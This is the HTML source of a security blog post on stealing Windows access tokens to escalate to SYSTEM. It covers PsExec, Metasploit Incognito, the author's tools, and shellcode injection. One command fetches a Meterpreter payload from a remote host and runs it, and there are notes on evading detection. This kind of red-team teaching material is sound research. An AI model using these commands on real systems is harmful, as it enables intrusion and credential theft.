@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <!-- ═══════════════════════════════════════════════
+       SEO – Primary Meta Tags
+  ════════════════════════════════════════════════ -->
+  <title>stickybitone•blog•004</title>
+  <meta name="description"
+        content="A deep-dive into at least 5 practical techniques for stealing Windows access tokens — from the classic PsExec trick and Metasploit's Incognito module, through custom userland tools (tWATa, tRWXi), all the way to kernel-level token theft with a custom Windows kernel driver (tKMD). Written for penetration testers and security researchers." />
+  <meta name="keywords"
+        content="Windows token theft, steal Windows token, token impersonation, privilege escalation Windows, PsExec SYSTEM, Metasploit Incognito, token hijacking, RWX memory injection, kernel token theft, BYOVD, Windows security research, red team techniques, lateral movement Active Directory, tWATa, tRWXi, tKMD, Windows internals, NT AUTHORITY SYSTEM" />
+  <meta name="author" content="stickybitone" />
+  <meta name="robots" content="index, follow" />
+  <link rel="canonical" href="https://stickybitone.github.io/blog/004/index.html" />
+  <link rel="stylesheet" href="../../css/blog.css">
+
+  <!-- ═══════════════════════════════════════════════
+       SEO – Article Schema (JSON-LD)
+  ════════════════════════════════════════════════ -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "TechArticle",
+    "headline": "At Least 5 Ways to Steal a Windows User Token: From Userland to Kernel",
+    "description": "A comprehensive guide covering multiple techniques for stealing Windows access tokens, ranging from the well-known PsExec utility and Metasploit's Incognito module to custom userland tools and kernel-level exploitation.",
+    "author": {
+      "@type": "Person",
+      "name": "stickybitone"
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "stickybitone blog",
+      "url": "https://stickybitone.github.io"
+    },
+    "datePublished": "2026-04-03",
+    "keywords": "Windows token theft, privilege escalation, token impersonation, red team, kernel exploitation, BYOVD",
+    "url": "https://stickybitone.github.io/blog/004/index.html",
+    "articleSection": "Security Research"
+  }
+  </script>
+</head>
+
+<body>
+
+  <main>
+    <h1>At Least 5 Ways to Steal a Windows User Token:<br>From Userland to Kernel</h1>
+    <p class="subtitle" style="text-align: center">
+      A practical walkthrough of token-impersonation and token-theft techniques —
+      from the well-known PsExec shortcut to custom kernel-level exploitation.
+    </p>
+
+
+    <!-- ── Introduction ── -->
+    <section id="intro">
+      <h2>Introduction</h2>
+
+      <p>
+        There are multiple techniques that can allow an attacker to steal a user token on a Windows client. 
+	In an Active Directory (AD) environment we are primarily interested in the tokens of domain users,
+        because a stolen domain token can enable lateral movement to other machines
+	in the same forest or domain. </p>
+	<p>On standalone Windows workstations the
+        <code>NT AUTHORITY\SYSTEM</code> account is the most attractive target as it grants nearly
+        unrestricted local access, which can be though restricted by local security tools such as EDR. 
+      </p>
+
+      <p>
+        In this article I review some of these techniques,
+        ranging from the trivially simple PsExec one-liner all the way to a fully custom Windows kernel driver that steals
+        tokens entirely from Kernel. 
+      </p>
+
+    </section>
+
+    <hr>
+
+    <!-- ── 01 PsExec ── -->
+    <section id="01-psexec">
+      <h2>01 &mdash; PsExec from Sysinternals</h2>
+
+      <p>
+        We start with the lowest-hanging fruit: <strong>PsExec</strong>, a
+        lightweight utility PsExec has been used for decades by system administrators for remote process
+        execution, but it is equally useful for privilege escalation.
+      </p>
+
+      <p><em>
+        It is important to understand why escalating from a local
+        administrator to SYSTEM is often necessary, even though an administrator
+        account already carries significant privileges. Certain operations — such as
+        fully leveraging Mimikatz to dump LSASS credentials, accessing protected
+        registry hives, or interacting with kernel-level security drivers — require a
+        SYSTEM token rather than a merely elevated administrator token. 
+      </em></p>
+
+        <p><strong>Prerequisites:</strong> Local administrator privileges.</p>
+	<p><strong>Source: </strong><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec"target="_blank" rel="noopener">Microsoft Sysinternals suite</a></p>
+
+      <h3>Usage</h3>
+      <pre><code>PsExec.exe -s -i cmd.exe</code></pre>
+
+      <p>Where:</p>
+      <ul>
+        <li><code>-s</code> &mdash; Runs the specified process under the
+          <code>NT AUTHORITY\SYSTEM</code> account by creating a temporary
+          Windows service.</li>
+        <li><code>-i</code> &mdash; Runs the process interactively on the current
+          desktop session, so the spawned window is visible to the logged-in user.
+	</li>
+      </ul>
+
+      <figure>
+        <img src="./img/01-psexec-1.png"
+             alt="Two terminal windows: the upper window shows a PowerShell session running as 'dev' with administrator privileges and the whoami /priv output listing SeDebugPrivilege, SeChangeNotifyPrivilege, SeImpersonatePrivilege, and SeCreateGlobalPrivilege as enabled. The lower window shows a cmd.exe session spawned by PsExec running as NT AUTHORITY\SYSTEM with a significantly expanded privilege set, including SeTcbPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, and SeDelegateSessionUserImpersonatePrivilege, demonstrating successful privilege escalation." />
+        <figcaption>
+          <strong>Figure 1.</strong> Privilege escalation from ADMINISTRATOR to SYSTEM
+          using PsExec. The upper pane shows the initial administrator PowerShell session
+          with a limited set of enabled privileges. After executing
+          <code>PsExec.exe -s -i cmd.exe</code>, the lower pane reveals a new
+          <code>cmd.exe</code> process running as <code>NT AUTHORITY\SYSTEM</code>.
+        </figcaption>
+      </figure>
+
+      <p>
+      Unfortunately, most endpoint-detection solutions heavily signature PsExec, which can result in its execution being blocked or the binary being tagged as malware. This is why it is important to get familiar with alternative techniques in order to be prepared for such scenarios.
+      </p>
+    </section>
+
+    <hr>
+
+    <!-- ── 02 Incognito ── -->
+    <section id="02-incognito">
+      <h2>02 &mdash; Metasploit's Incognito Module</h2>
+
+      <p>
+        The <strong>Incognito</strong> module provides a fast and convenient way to list and impersonate Windows tokens
+        from within an existing Meterpreter session. 
+      </p>
+
+      <p>
+        Despite being over a decade old, the technique remains effective. Windows
+        Defender and many third-party antivirus products do not block token
+        impersonation performed via utilized legitimate Win32 API calls, which allow bypassing its detection.
+      </p>
+
+      <p><strong>Prerequisites:</strong> An active Meterpreter session running with
+      local administrator privileges.</p>
+	<p><strong>Source: </strong> <a href="https://github.com/rapid7/meterpreter/blob/master/source/extensions/incognito/incognito.c" target="_blank">incognito.c</a></p>
+
+
+      <h3>Usage</h3>
+      <pre><code>
+meterpreter > load incognito
+meterpreter > list_tokens -u
+meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"</code></pre>
+
+      <ol>
+        <li>Load the extension into the current Meterpreter session with
+          <code>load incognito</code>.</li>
+        <li>Run <code>list_tokens -u</code> to enumerate all tokens accessible from
+          the current process context. Output is separated into Delegation and
+          Impersonation categories.</li>
+        <li>Call <code>impersonate_token</code> with the target account name.
+          Metasploit will search the token list for a matching entry and call
+          <code>ImpersonateLoggedOnUser</code> on the duplicated handle.</li>
+        <li>Verify the result with <code>getuid</code>, which should now return
+          <code>NT AUTHORITY\SYSTEM</code>.</li>
+      </ol>
+
+      <figure>
+        <img src="./img/02-incognito-1.png"
+             alt="Meterpreter terminal output showing the Incognito module being loaded, tokens being listed (including delegation tokens for DESKTOP-00EQ2TL\dev and NT AUTHORITY\SYSTEM), and the successful impersonation of NT AUTHORITY\SYSTEM, confirmed by the getuid command returning 'Server username: NT AUTHORITY\SYSTEM'." />
+        <figcaption>
+          <strong>Figure 2.</strong> Privilege escalation from ADMINISTRATOR to SYSTEM
+          using Metasploit's Incognito module. The session begins with the
+          <code>DESKTOP-00EQ2TL\dev</code> user context. After loading the extension
+          and listing available tokens, both a user delegation token and a SYSTEM
+          delegation token are visible. The
+          <code>impersonate_token "NT AUTHORITY\\SYSTEM"</code> command successfully
+          impersonates the SYSTEM token, confirmed by <code>getuid</code> returning
+          <code>NT AUTHORITY\SYSTEM</code>. 
+        </figcaption>
+      </figure>
+    </section>
+
+    <hr>
+
+    <!-- ── 03 tWATa ── -->
+    <section id="03-twata">
+      <h2>03 &mdash; tWATa &mdash; Windows Token Theft</h2>
+
+      <p>
+        <strong>tWATa</strong> (<em>Windows Access Token abuser</em>) is a
+        custom, standalone implementation of the token-impersonation logic found in
+        Incognito. 
+      </p>
+
+      <p>tWATa adds the following capabilities:</p>
+      <ul>
+        <li><strong>Enumeration mode</strong> (<code>--enumerate</code>) — lists all
+          processes and their associated tokens, grouped by integrity level and token
+          type, giving the operator a clear overview of available targets.</li>
+        <li><strong>Targeted stealing</strong> (<code>--pid &lt;PID&gt;</code>) —
+          allows the operator to explicitly specify the source process ID from which
+          the token should be stolen.</li>
+	<li><strong>Flexible target process</strong> (<code>--cmd &lt;cmd&gt;</code>) — the operator can specify which
+          new process to spawn under the stolen token (defaults to <code>cmd.exe</code>
+          when no argument is provided).</li>
+      </ul>
+
+      <p><strong>Prerequisites:</strong> Local administrator privileges to access processes running at HIGH or
+      SYSTEM integrity levels.</p>
+     <p><strong>Source: </strong><a href="https://github.com/stickybitone/tWATa" target="_blank">tWATa.sln</a></p>
+
+      <h3>Usage</h3>
+      <pre><code># Enumerate available tokens
+.\tWATa.exe --enumerate
+
+# Steal the token from PID 444 and spawn cmd.exe
+.\tWATa.exe --pid 444
+
+# Steal the token from PID 444 and inject it into the Meterpreter session
+.\tWATa.exe --pid 444 --cmd "C:\Windows\Temp\met443.exe"</code></pre>
+
+      <figure>
+        <img src="./img/03-twata-1.png"
+	     alt="PowerShell terminal running tWATa.exe with the --enumerate flag."/>
+        <figcaption>
+          <strong>Figure 3.</strong> tWATa running in enumeration mode
+          (<code>--enumerate</code>). The tool lists all accessible process tokens,
+          grouped by account. By default — when no cmd argument is provided — tWATa will spawn a new <code>cmd.exe</code> process.
+        </figcaption>
+      </figure>
+
+      <figure>
+        <img src="./img/03-twata-2.png"
+             alt="PowerShell terminal showing tWATa.exe being executed with --pid 444 and a command argument pointing to the Meterpreter payload. Output lines confirm: 'stealing token', 'starting new process: 8032'. A second terminal window shows the Meterpreter session confirming NT AUTHORITY\SYSTEM identity." />
+        <figcaption>
+          <strong>Figure 4.</strong> tWATa stealing a SYSTEM token from PID 444 and
+          injecting it into a new Meterpreter session
+        </figcaption>
+      </figure>
+
+      <figure>
+        <img src="./img/03-twata-3.png"
+             alt="Meterpreter terminal output showing 'Meterpreter session 3 opened' followed by getuid returning 'Server username: NT AUTHORITY\SYSTEM' and getpid returning PID 8032, confirming the session is running as SYSTEM." />
+        <figcaption>
+          <strong>Figure 5.</strong> The resulting Meterpreter session confirms the session is running
+	  as <code>NT AUTHORITY\SYSTEM</code>
+        </figcaption>
+      </figure>
+    </section>
+
+    <hr>
+
+    <!-- ── 04 tRWXi ── -->
+    <section id="04-trwxi">
+      <h2>04 &mdash; tRWXi &mdash; Token Theft via Payload Injection into RWX Regions</h2>
+
+      <p>
+        This technique moves beyond token duplication and instead achieves
+        impersonation by injecting a shellcode payload directly into an
+        existing process that is already running in the another user's context. 
+      </p>
+
+	<p>More on this technique in my research article: <a href="https://trovent.io/en/exploiting-rwx-memory-regions/" target="_blank">Exploiting RWX Memory Regions</a></p>
+	<h3>Usage</h3>
+      <ol>
+        <li>Scan all running processes with RWX memory regions.</li>
+	<li>Write the shellcode payload into the discovered RWX region.</li>
+        <li>Redirect execution to the shellcode by creating a remote thread pointing at the written payload.</li>
+      </ol>
+
+	<p><strong>Prerequisites:</strong> Local administrator privileges in order to see processes beyond the MEDIUM integrity level.</p>
+	<p><strong>Source: </strong><a href="https://github.com/stickybitone/tRWXi" target="_blank">tRWXi.sln</a></p>
+
+      <h3>Usage</h3>
+      <pre><code>.\tRWXi.exe /inject /pid=14272 /address=0x1C15F0000 /url=http://192.168.116.129:80/met443.num /execute</code></pre>
+
+      <figure>
+	<img src="./img/04-trwxi-1.png" 
+             alt="PowerShell terminal showing tRWXi enumerating RWX memory regions in system process PID 14272. Several base addresses and sizes are listed. Output lines confirm: 'Started injection', '511 bytes written into RWX region', 'Starting execution', 'Successfully executed code. Thread handle [1416] has been created'." />
+        <figcaption>
+          <strong>Figure 6.</strong> Privilege escalation from ADMINISTRATOR to SYSTEM
+          using tRWXi. The tool enumerates the RWX memory regions present in the
+          target process (PID 14272) and then writes a 511-byte Meterpreter shellcode payload into one of those
+          pre-existing executable pages and creates a remote thread to execute it.
+	<figure>
+
+      <figure>
+	<img src="./img/04-trwxi-2.png" 
+             alt="Meterpreter terminal showing 'Meterpreter session 4 opened' at 192.168.116.129:443. getuid returns 'Server username: NT AUTHORITY\SYSTEM' and getpid returns 14272, confirming the session is running inside the injected process." />
+        <figcaption>
+          <strong>Figure 7.</strong> The resulting Meterpreter session after RWX
+          payload injection. <code>getuid</code> confirms the session context is
+          <code>NT AUTHORITY\SYSTEM</code>, and <code>getpid</code> returns 14272 —
+          the same process ID targeted for injection. 
+        </figcaption>
+      </figure>
+    </section>
+
+	<p>A very similar approach can be achieved by abusing threads in external processes. 
+	<p>Thread hijacking allows you to modify the EIP or RIP register (based on whether the architecture is x86 or x64 respectively) and detour it to a memory region containing the prepared payload.</p>
+
+	<p><strong>Source: </strong><a href="https://github.com/stickybitone/THi" target="_blank">THi.sln</a></p>
+
+    <hr>
+
+    <!-- ── 05 tKMD ── -->
+    <section id="05-tkmd">
+      <h2>05 &mdash; tKMD &mdash; Token Theft via Kernel Exploitation</h2>
+
+      <p>
+        All of the techniques discussed so far operate entirely in RING 3 and rely on Windows API functions from userland.
+	A custom Windows kernel driver on the other side operates inside the Windows kernel itself. 
+	</p>
+	<p>
+	While <strong>tKMD</strong> uses a purpose-built test-signed driver, the same
+        technique can be applied in real-world red-team engagements via
+        <strong>Bring Your Own Vulnerable Driver (BYOVD)</strong>. 
+      </p>
+
+
+     <p><strong>Prerequisites:</strong> The ability to load a kernel driver on the
+     target system or abuse an available vulnerable driver in place.</p> 
+     <p><strong>Source: </strong><a href="https://github.com/stickybitone/tKMD" target="_blank">tKMD.sln</a></p>
+
+      <h3>Usage</h3>
+
+      <figure>
+	<img src="./img/05-tkmd-1.png" 
+             alt="Two side-by-side terminal windows. The left window shows a cmd.exe session initially running as a low-privileged user. The right window shows a PowerShell session running tKMDc.exe, displaying the full IOCTL menu (Ring 0 through Ring 11). The command '.\tKMDc.exe 10 Spid 1500 5986' is executed. Output confirms: 'a token from [1500] was assigned to [5986]'. The left terminal's whoami command then returns 'nt authority\system'." />
+        <figcaption>
+          <strong>Figure 8.</strong> Token theft via the tKMD Windows kernel driver.
+	  Stealing the access token from a high-privileged process (PID 3508) and assigning it to
+          the low-privileged target process (PID 5984). 
+        </figcaption>
+      </figure>
+    </section>
+
+    <hr>
+
+    <!-- ── Disclaimer ── -->
+   <div class="warning-box">
+      <p>
+        <strong>Disclaimer:</strong>
+        <em>
+          The techniques described in this article are powerful tools for legitimate
+          security research and penetration testing. Always ensure that you have
+          explicit, written authorisation from the system owner before deploying any
+          of these techniques against a target. 
+        </em>
+      </p>
+    </div>
+  </main>
+</body>
+</html>
